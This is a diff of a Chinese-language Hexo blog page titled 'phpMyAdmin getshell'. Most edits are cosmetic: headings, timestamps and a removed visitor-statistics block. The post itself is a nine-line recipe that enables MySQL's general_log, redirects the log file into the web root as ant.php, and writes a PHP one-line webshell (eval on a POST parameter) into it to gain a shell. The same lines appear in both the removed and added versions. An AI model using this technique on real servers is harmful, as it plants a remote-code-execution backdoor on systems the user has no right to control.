@@ -16,19 +16,19 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 序可以利用phpMyAdmin报错日志的功能进行getshell。 0x02 利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_">
+    <meta name="description" content="0、简介可以利用phpMyAdmin报错日志的功能进行getshell。 1、利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_file">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpMyAdmin getshell">
 <meta property="og:url" content="http://example.com/2020/09/10/phpMyAdmin%20getshell/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog">
-<meta property="og:description" content="0x01 序可以利用phpMyAdmin报错日志的功能进行getshell。 0x02 利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_">
+<meta property="og:description" content="0、简介可以利用phpMyAdmin报错日志的功能进行getshell。 1、利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_file">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x509.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x236.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-2-1024x520.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-4-1024x641.png">
 <meta property="article:published_time" content="2020-09-10T04:31:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T10:09:26.295Z">
+<meta property="article:modified_time" content="2024-07-01T12:35:37.054Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="getshell">
 <meta name="twitter:card" content="summary_large_image">
@@ -76,7 +76,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -239,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          91 字
+          94 字
         
       </span>
     
@@ -300,8 +300,8 @@
             
               <div class="markdown-body">
                 
-                <h4 id="0x01-序"><a href="#0x01-序" class="headerlink" title="0x01 序"></a>0x01 序</h4><p>可以利用phpMyAdmin报错日志的功能进行getshell。</p>
-<h4 id="0x02-利用报错日志getshell"><a href="#0x02-利用报错日志getshell" class="headerlink" title="0x02 利用报错日志getshell"></a>0x02 利用报错日志getshell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看日子记录状态</span><br>show variables like <span class="hljs-string">&quot;general_log%&quot;</span><br><span class="hljs-comment">#开启日志设置为on</span><br><span class="hljs-built_in">set</span> global general_log=<span class="hljs-string">&#x27;on&#x27;</span><br><span class="hljs-comment">#设置日志保存路径</span><br><span class="hljs-built_in">set</span> global  general_log_file =<span class="hljs-string">&quot;D:\\phpStudy\\PHPTutorial\\WWW\\ant.php&quot;</span><br><span class="hljs-comment">#写入一句话木马到日志文件</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-variable">$_POST</span>[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="hljs-comment">#访问/ant.php拿到shell</span><br></code></pre></td></tr></table></figure>
+                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>可以利用phpMyAdmin报错日志的功能进行getshell。</p>
+<h4 id="1、利用报错日志getshell"><a href="#1、利用报错日志getshell" class="headerlink" title="1、利用报错日志getshell"></a>1、利用报错日志getshell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看日子记录状态</span><br>show variables like <span class="hljs-string">&quot;general_log%&quot;</span><br><span class="hljs-comment">#开启日志设置为on</span><br><span class="hljs-built_in">set</span> global general_log=<span class="hljs-string">&#x27;on&#x27;</span><br><span class="hljs-comment">#设置日志保存路径</span><br><span class="hljs-built_in">set</span> global  general_log_file =<span class="hljs-string">&quot;D:\\phpStudy\\PHPTutorial\\WWW\\ant.php&quot;</span><br><span class="hljs-comment">#写入一句话木马到日志文件</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-variable">$_POST</span>[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="hljs-comment">#访问/ant.php拿到shell</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x509.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x236.png" srcset="/img/loading.gif" lazyload alt="img"></p>
@@ -471,30 +471,6 @@
        <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
   
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
   
   
   
